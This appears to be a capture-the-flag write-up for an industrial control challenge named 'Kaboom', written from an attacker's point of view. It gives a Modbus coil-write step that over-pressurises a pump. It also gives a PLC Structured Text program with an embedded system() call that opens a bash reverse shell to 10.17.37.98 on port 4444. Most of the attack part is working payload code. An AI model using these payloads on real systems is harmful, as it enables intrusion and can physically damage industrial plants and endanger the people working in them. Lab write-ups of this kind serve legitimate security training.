---
title: Kaboom
categories: OT
tags: 
draft: true
completedDuringEvent: true
submitted: true
flags: flag: THM{REDACTED}
---
> This challenge drops you into the shoes of the APT operator: With a single crafted Modbus, you over-pressurise the main pump, triggering a thunderous blow-out that floods the plant with alarms. While chaos reigns, your partner ghosts through the shaken DMZ and installs a stealth implant, turning the diversion’s echo into your persistent beachhead.

---

## Modbus

Write coils from address `0` to `100?` with values `1`.

## Ubuntu Access

```
PROGRAM prog0
  VAR
    var_in : BOOL;
    var_out : BOOL;
  END_VAR

  var_out := var_in;

  { system("bash -c 'bash -i >& /dev/tcp/10.17.37.98/4444 0>&1'"); }
END_PROGRAM


CONFIGURATION Config0

  RESOURCE Res0 ON PLC
    TASK Main(INTERVAL := T#50ms,PRIORITY := 0);
    PROGRAM Inst0 WITH Main : prog0;
  END_RESOURCE
END_CONFIGURATION
```
